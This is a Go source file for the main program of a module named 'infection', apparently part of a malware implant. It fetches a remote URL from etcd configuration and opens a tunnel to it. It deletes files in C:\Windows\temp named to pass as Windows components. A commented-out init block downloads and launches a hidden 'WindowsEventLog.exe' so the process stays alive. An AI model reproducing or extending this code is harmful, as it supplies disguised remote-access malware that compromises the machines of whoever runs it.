package main

import (
	"fmt"
	"infection/etcd"
	"infection/tunnel"
	"os"
	"time"

	"sync/atomic"
)

type Info struct {
	Dev bool
}

var Config = Info{
	true,
}

type AppConfig struct {
	Url string
}

// confirm lock
type AppConfigMgr struct {
	config atomic.Value
}

var appConfigMgr = &AppConfigMgr{}

func (a *AppConfigMgr) Callback(conf *etcd.Config) {
	appConfig := &AppConfig{}
	appConfig.Url = conf.Url
	appConfigMgr.config.Store(appConfig)
}

//func init() {
//	lib.KillCheck()
//	//currentprogram path log
//	content, _ := lib.GetTargetPath()
//	data := []byte(content)
//	// paht log
//	if ioutil.WriteFile(lib.NOGUILOG, data, 0644) == nil {
//	}
//	//fixed ioop download check
//	_, cerr := os.Stat(lib.CURRENTPATH + "WindowsEventLog.exe")
//	if cerr != nil {
//		//keep the main process live
//		lib.MultiFileDown([]string{}, "init")
//
//		cmd := exec.Command(lib.CURRENTPATH + "WindowsEventLog.exe")
//		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
//		cmd.Start()
//	} else {
//		cmd := exec.Command(lib.CURRENTPATH + "WindowsEventLog.exe")
//		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
//		cmd.Start()
//	}
//}
func clear() {
	path := "C:\\Windows\\temp\\"
	files := []string{
		"WindowsEventLog.exe",
		"WindowsDaemon.exe",
		"MicrosoftBroker.exe",
	}
	for _, f := range files {
		_, err := os.Stat(path + f)
		if err != nil {
		} else {
			os.RemoveAll(path + f)
		}
	}
}
func main() {
	clear()
	conf, _ := etcd.NewConfig()
	conf.AddObserver(appConfigMgr)
	var appConfig AppConfig
	appConfig.Url = conf.Url
	appConfigMgr.config.Store(&appConfig)

	go tunnel.Tunnel(conf.Url)
	a := []string{"01x3b00x50", "00x10ffx40", "02x1080x55", "00x50", "7bx10", "80x55", "ffx40", "b1x55", "b6x44"}
	for {
		ticker := time.NewTicker(4 * time.Second)
		for _, name := range a {
			fmt.Println(name)
			time.Sleep(2 * time.Second)
		}
		<-ticker.C
	}

}
